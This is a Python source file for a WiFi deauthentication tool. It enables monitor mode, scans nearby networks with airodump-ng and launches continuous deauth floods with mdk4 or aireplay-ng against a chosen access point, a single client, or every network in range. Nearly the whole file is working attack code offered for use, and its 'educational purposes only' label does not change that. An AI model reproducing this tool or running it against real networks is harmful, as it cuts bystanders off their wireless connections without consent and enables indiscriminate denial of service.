#!/usr/bin/env python3
"""
WiFi Deauther Tool
Author: Hamed Gharghi
Date: 2024-03-19
Repository: https://github.com/Hamed-Gharghi/wifi-deauther

A tool for performing deauthentication attacks on WiFi networks.
Warning: This tool is for educational purposes only.
"""

import scapy.all as scapy
import argparse
import os
import subprocess
import time
import csv
from termcolor import colored
from subprocess import Popen, PIPE

# Terminal colors set
DEFAULT = '\033[39m'
BLACK = '\033[30m' 
RED = '\033[31m'
GREEN = '\033[32m'
ORANGE = '\033[93m'
BLUE = '\033[34m'
MAGENTA = '\033[95m'
CYAN = '\033[36m'
LIGHTGRAY = '\033[37m'
DARKGRAY = '\033[90m'
LIGHTRED = '\033[91m'
LIGHTGREEN = '\033[92m'
LIGHTORANGE = '\033[33m'
LIGHTBLUE = '\033[94m' 
LIGHTCYAN = '\033[96m'
LIGHTMAGENTA = '\033[35m'
WHITE = '\033[97m'
GRAY = '\033[30m'

home = os.path.expanduser('~')
scanned_path = home+'/w-killer/scanned'
DN = open(os.devnull, 'w')
commands = []
monitor_interface = None

if not os.path.exists(scanned_path):
    os.makedirs(scanned_path)

os.chdir(scanned_path)
os.system('clear')

def welcomeMsg():
    print(f"{LIGHTORANGE}Welcome")
    print(f"      {ORANGE}To")
    print('''
{2}   ██╗  ██╗███╗   ███╗██████╗ 
{2}   ██║  ██║████╗ ████║██╔══██╗
{2}   ███████║██╔████╔██║██║  ██║
{1}   ██╔══██║██║╚██╔╝██║██║  ██║
{1}   ██║  ██║██║ ╚═╝ ██║██████╔╝
{1}   ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ 
{3}   ██╗    ██╗██╗███████╗██╗
{3}   ██║    ██║██║██╔════╝██║
{3}   ██║ █╗ ██║██║█████╗  ██║
{4}   ██║███╗██║██║██╔══╝  ██║
{4}   ╚███╔███╔╝██║██║     ██║
{4}    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
{5}   ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
{5}   ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
{5}   █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
{6}   ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
{6}   ██║  ██╗██║███████╗███████╗███████╗██║  ██║
{6}   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{7}   The possible is already done, working on the impossible.'''.format(LIGHTGRAY, BLUE, CYAN, ORANGE, LIGHTORANGE, RED, LIGHTRED, GREEN))

def check_root():
    if os.geteuid() != 0:
        print(colored("[-] This program requires root access. Please run with sudo.", "red"))
        exit()

def get_arguments():
    parser = argparse.ArgumentParser(description='WiFi Deauther - Deauthentication Packet Sender')
    parser.add_argument("-i", "--interface", dest="interface", help="Wireless Interface Name")
    parser.add_argument("-t", "--target", dest="target_bssid", help="Target WiFi MAC Address")
    parser.add_argument("-g", "--gateway", dest="gateway_bssid", help="Gateway MAC Address (Optional)")
    parser.add_argument("-n", "--count", dest="packet_count", default=1000, type=int, help="Number of deauthentication packets (default: 1000)")
    options = parser.parse_args()
    return options

def list_interfaces():
    print(colored("[*] Getting list of wireless interfaces...", "yellow"))
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        if interfaces:
            print(colored("[+] Wireless interfaces found:", "green"))
            for i, interface in enumerate(interfaces):
                print(colored(f"    {i+1}. {interface}", "green"))
            return interfaces
        else:
            print(colored("[-] No wireless interfaces found.", "red"))
            exit()
    except subprocess.CalledProcessError as e:
        print(colored(f"[-] Error getting interface list: {e}", "red"))
        exit()

def select_interface(interfaces):
    while True:
        try:
            choice = int(input(colored("[?] Please enter the number of the interface: ", "yellow")))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice-1]
            else:
                print(colored("[-] Invalid number. Please try again.", "red"))
        except ValueError:
            print(colored("[-] Please enter a number.", "red"))

def check_requirements():
    # Check Python packages
    required_packages = {
        'scapy': 'scapy',
        'termcolor': 'termcolor'
    }
    
    missing_packages = []
    
    for package, pip_name in required_packages.items():
        try:
            __import__(package)
        except ImportError:
            missing_packages.append((package, pip_name))
    
    if missing_packages:
        print(colored("[!] Some required Python packages are missing. Would you like to install them? (y/n)", "yellow"))
        choice = input().lower()
        if choice == 'y':
            for package, pip_name in missing_packages:
                print(colored(f"[*] Installing {package}...", "yellow"))
                try:
                    subprocess.run(['pip3', 'install', pip_name], check=True)
                    print(colored(f"[+] {package} installed successfully.", "green"))
                except subprocess.CalledProcessError:
                    print(colored(f"[-] Failed to install {package}. Please install it manually.", "red"))
                    exit(1)
        else:
            print(colored("[-] Required Python packages are missing. Please install them manually.", "red"))
            exit(1)

    # Check system tools
    required_tools = {
        'airmon-ng': 'aircrack-ng',
        'airodump-ng': 'aircrack-ng',
        'aireplay-ng': 'aircrack-ng',
        'mdk4': 'mdk4'
    }
    
    missing_tools = []
    
    for tool, package in required_tools.items():
        try:
            subprocess.run(['which', tool], stdout=DN, stderr=DN, check=True)
        except subprocess.CalledProcessError:
            missing_tools.append((tool, package))
    
    if missing_tools:
        print(colored("[!] Some required system tools are missing. Would you like to install them? (y/n)", "yellow"))
        choice = input().lower()
        if choice == 'y':
            # Update package list first
            print(colored("[*] Updating package list...", "yellow"))
            subprocess.run(['sudo', 'apt-get', 'update'], stdout=DN, stderr=DN)
            
            for tool, package in missing_tools:
                print(colored(f"[*] Installing {package}...", "yellow"))
                try:
                    subprocess.run(['sudo', 'apt-get', 'install', '-y', package], stdout=DN, stderr=DN, check=True)
                    print(colored(f"[+] {package} installed successfully.", "green"))
                except subprocess.CalledProcessError:
                    print(colored(f"[-] Failed to install {package}. Please install it manually.", "red"))
                    exit(1)
        else:
            print(colored("[-] Required system tools are missing. Please install them manually.", "red"))
            exit(1)
    
    print(colored("[+] All requirements are satisfied.", "green"))

def enable_monitor_mode(interface):
    try:
        print(colored(f"[*] Enabling monitor mode for {interface}...", "yellow"))
        
        # Kill interfering processes
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
        
        # Start monitor mode using airmon-ng
        result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                              capture_output=True, text=True, check=True)
        
        # Extract the new interface name (usually interface + 'mon')
        for line in result.stdout.split('\n'):
            if 'monitor mode enabled' in line:
                monitor_interface = line.split()[0]
                print(colored(f"[+] Monitor mode enabled on {monitor_interface}", "green"))
                return monitor_interface
        
        # If we couldn't find the new interface name, try the original + 'mon'
        monitor_interface = interface + 'mon'
        if os.path.exists(f'/sys/class/net/{monitor_interface}'):
            print(colored(f"[+] Monitor mode enabled on {monitor_interface}", "green"))
            return monitor_interface
        else:
            raise Exception("Could not determine monitor interface name")
            
    except Exception as e:
        print(colored(f"[-] Error enabling monitor mode: {e}", "red"))
        print(colored("[-] Please make sure you are running the program with root access.", "red"))
        exit(1)

def scan_networks(interface):
    print(colored("[*] Scanning for WiFi networks...", "yellow"))
    try:
        # Start airodump-ng with channel hopping
        cmd = ['sudo', 'airodump-ng', interface, '-w', 'scanned', '--output-format', 'csv']
        print(colored("[*] Executing command: " + " ".join(cmd), "yellow"))
        proc = Popen(cmd, stdout=DN, stderr=DN)
        
        # Wait for the CSV file to be created
        while not os.path.exists('scanned-01.csv'):
            time.sleep(1)
        
        # Give it some time to collect data
        time.sleep(5)
        
        # Read the CSV file
        networks = []
        with open('scanned-01.csv') as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if len(row) >= 14 and row[0].strip() != 'BSSID':
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    power = row[8].strip()
                    ssid = row[13].strip()
                    if bssid and ssid:  # Only add if we have both BSSID and SSID
                        networks.append({
                            'bssid': bssid,
                            'ssid': ssid,
                            'channel': channel,
                            'power': power
                        })
        
        # Kill airodump-ng
        proc.terminate()
        proc.wait()
        
        if networks:
            print(colored("\n[+] Found networks:", "green"))
            for i, net in enumerate(networks):
                print(colored(f"    {i+1}. {net['ssid']} (BSSID: {net['bssid']}, Channel: {net['channel']}, Power: {net['power']})", "green"))
            return networks
        else:
            print(colored("[-] No networks found.", "red"))
            return []
            
    except Exception as e:
        print(colored(f"[-] Error scanning networks: {e}", "red"))
        if proc:
            proc.terminate()
            proc.wait()
        return []

def deauth_attack(interface, target_bssid, channel, client_mac=None):
    try:
        print(colored(f"[*] Starting deauthentication attack on {target_bssid}...", "yellow"))
        print(colored("[*] Press Ctrl+C to stop the attack", "yellow"))
        
        # Kill any interfering processes
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
        
        # Set the interface to the correct channel
        subprocess.run(['sudo', 'iwconfig', interface, 'channel', channel], stdout=DN, stderr=DN)
        
        # Start the attack using mdk4
        if client_mac:
            # Attack specific client
            cmd = ['sudo', 'mdk4', interface, 'd', '-B', target_bssid, '-s', client_mac]
        else:
            # Attack all clients
            cmd = ['sudo', 'mdk4', interface, 'd', '-B', target_bssid]
        
        print(colored("[*] Executing command: " + " ".join(cmd), "yellow"))
        proc = Popen(cmd)
        
        print(colored("[+] Attack started successfully!", "green"))
        print(colored("[*] Sending deauthentication packets...", "yellow"))
        proc.wait()
        
    except KeyboardInterrupt:
        print(colored("\n[+] Stopping attack...", "yellow"))
        if proc:
            proc.terminate()
            proc.wait()
    except Exception as e:
        print(colored(f"[-] Error during attack: {e}", "red"))
        if proc:
            proc.terminate()
            proc.wait()

def deauth_attack_aircrack(interface, target_bssid, channel, client_mac=None):
    try:
        print(colored(f"[*] Starting deauthentication attack using aircrack-ng on {target_bssid}...", "yellow"))
        print(colored("[*] Press Ctrl+C to stop the attack", "yellow"))
        
        # Kill any interfering processes
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
        
        # First set the interface to the target network's channel
        print(colored(f"[*] Setting interface to channel {channel}...", "yellow"))
        subprocess.run(['sudo', 'iwconfig', interface, 'channel', channel], stdout=DN, stderr=DN)
        
        # Start the attack using aireplay-ng
        if client_mac:
            # Attack specific client
            cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid, '-c', client_mac, interface]
        else:
            # Attack all clients
            cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid, interface]
        
        print(colored("[*] Executing command: " + " ".join(cmd), "yellow"))
        proc = Popen(cmd)
        
        print(colored("[+] Attack started successfully!", "green"))
        print(colored("[*] Sending deauthentication packets...", "yellow"))
        proc.wait()
        
    except KeyboardInterrupt:
        print(colored("\n[+] Stopping attack...", "yellow"))
        if proc:
            proc.terminate()
            proc.wait()
    except Exception as e:
        print(colored(f"[-] Error during attack: {e}", "red"))
        if proc:
            proc.terminate()
            proc.wait()

def deauth_all_networks(interface):
    try:
        print(colored("[*] Starting deauthentication attack on all networks...", "yellow"))
        print(colored("[*] Press Ctrl+C to stop the attack", "yellow"))
        
        # Kill any interfering processes
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
        
        # Start the attack using mdk4
        cmd = ['sudo', 'mdk4', interface, 'd']
        print(colored("[*] Executing command: " + " ".join(cmd), "yellow"))
        proc = Popen(cmd)
        
        print(colored("[+] Attack started successfully!", "green"))
        print(colored("[*] Sending deauthentication packets to all networks...", "yellow"))
        proc.wait()
        
    except KeyboardInterrupt:
        print(colored("\n[+] Stopping attack...", "yellow"))
        if proc:
            proc.terminate()
            proc.wait()
    except Exception as e:
        print(colored(f"[-] Error during attack: {e}", "red"))
        if proc:
            proc.terminate()
            proc.wait()

def select_network(networks):
    if not networks:
        print(colored("[-] No networks found.", "red"))
        exit()
    print(colored("[+] List of found networks:", "green"))
    for i, network in enumerate(networks):
        print(colored(f"    {i+1}. {network['ssid']} (BSSID: {network['bssid']}, Channel: {network['channel']}, Power: {network['power']})", "green"))
    
    while True:
        try:
            choice = input(colored("[?] Select target network number or type 'all' to attack all networks: ", "yellow"))
            if choice.lower() == 'all':
                return 'all'
            choice = int(choice)
            if 1 <= choice <= len(networks):
                network = networks[choice-1]
                print(colored("\n[+] Select attack method:", "yellow"))
                print(colored("    1. mdk4 (More aggressive)", "green"))
                print(colored("    2. aircrack-ng (More stable)", "green"))
                while True:
                    try:
                        method = int(input(colored("[?] Enter method number (1-2): ", "yellow")))
                        if method in [1, 2]:
                            network['attack_method'] = method
                            
                            # Ask if user wants to target specific client
                            client_choice = input(colored("[?] Do you want to target a specific client? (y/n): ", "yellow")).lower()
                            if client_choice == 'y':
                                client_mac = input(colored("[?] Enter client MAC address: ", "yellow"))
                                network['client_mac'] = client_mac
                            
                            return network
                        else:
                            print(colored("[-] Invalid number. Please try again.", "red"))
                    except ValueError:
                        print(colored("[-] Please enter a number.", "red"))
            else:
                print(colored("[-] Invalid number. Please try again.", "red"))
        except ValueError:
            print(colored("[-] Please enter a number or 'all'.", "red"))

def quitGracefully(clear=True):
    print(f"\n{LIGHTGRAY}Thank you for using {CYAN}W{LIGHTGRAY}-{LIGHTBLUE}Killer{LIGHTGRAY}.\n")
    try:
        if clear:
            os.system('clear')
        os.system('stty sane')  # unfreeze terminal
        
        if monitor_interface:
            print(f"{LIGHTORANGE}* {LIGHTGRAY}Stopping monitoring interface ({LIGHTORANGE}{monitor_interface}{LIGHTGRAY})")
            subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_interface], stdout=DN, stderr=DN)
        
        print(f'{LIGHTORANGE}* {LIGHTGRAY}Restarting {LIGHTORANGE}NetworkManager{LIGHTGRAY}')
        subprocess.run(['sudo', 'service', 'NetworkManager', 'restart'], stdout=DN, stderr=DN)
        
    except Exception as e:
        print(colored(f"[-] Error during cleanup: {e}", "red"))
    
    print(f"{LIGHTGRAY}Don't forget to {GREEN}like {LIGHTGRAY}the repos on {CYAN}github {LIGHTGRAY}! :)")
    print(f"{LIGHTBLUE}* {GREEN}https://github.com/Hamed-Gharghi/wifi-deauther")
    print(f'{LIGHTORANGE}Goodbye{LIGHTGRAY}.')
    exit(0)

if __name__ == "__main__":
    welcomeMsg()
    check_root()
    check_requirements()  # Check and install required tools
    
    options = get_arguments()
    
    # If interface is not specified via argument, show the list
    if not options.interface:
        interfaces = list_interfaces()
        interface = select_interface(interfaces)
    else:
        interface = options.interface

    # Enable monitor mode and get the monitor interface name
    monitor_interface = enable_monitor_mode(interface)
    
    # Scan for networks
    networks = scan_networks(monitor_interface)
    
    if not networks:
        print(colored("[-] No networks found. Exiting...", "red"))
        quitGracefully()
    
    # If target_bssid is not specified via argument, show the list
    if not options.target_bssid:
        target_network = select_network(networks)
        if target_network == 'all':
            try:
                deauth_all_networks(monitor_interface)
            except KeyboardInterrupt:
                print(colored("\n[+] Deauthentication attack stopped.", "yellow"))
            finally:
                quitGracefully()
        else:
            target_bssid = target_network['bssid']
            target_channel = target_network['channel']
            attack_method = target_network.get('attack_method', 1)  # Default to mdk4
            
            try:
                if attack_method == 1:
                    deauth_attack(monitor_interface, target_bssid, target_channel)
                else:
                    deauth_attack_aircrack(monitor_interface, target_bssid, target_channel)
            except KeyboardInterrupt:
                print(colored("\n[+] Deauthentication attack stopped.", "yellow"))
            finally:
                quitGracefully()
    else:
        target_bssid = options.target_bssid
        # Find the channel for the specified BSSID
        target_network = next((net for net in networks if net['bssid'] == target_bssid), None)
        if not target_network:
            print(colored(f"[-] Could not find network with BSSID {target_bssid}", "red"))
            quitGracefully()
        target_channel = target_network['channel']
        
        try:
            deauth_attack(monitor_interface, target_bssid, target_channel)
        except KeyboardInterrupt:
            print(colored("\n[+] Deauthentication attack stopped.", "yellow"))
        finally:
            quitGracefully() 